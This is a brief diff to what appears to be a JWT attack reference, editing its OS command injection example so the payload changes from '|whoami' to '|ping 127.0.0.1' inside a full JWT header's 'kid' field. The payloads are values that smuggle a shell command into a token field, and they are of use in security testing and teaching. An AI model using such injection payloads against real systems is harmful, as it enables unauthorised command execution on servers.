@@ -73,10 +73,14 @@ key = open(kid).read
 
 ### OS Command Injection
 
-Payload: `|whoami`
+Payload: `|ping 127.0.0.1`
 
 ```json
-"kid": "|whoami"
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "|ping 127.0.0.1"
+}
 ```
 
 ---
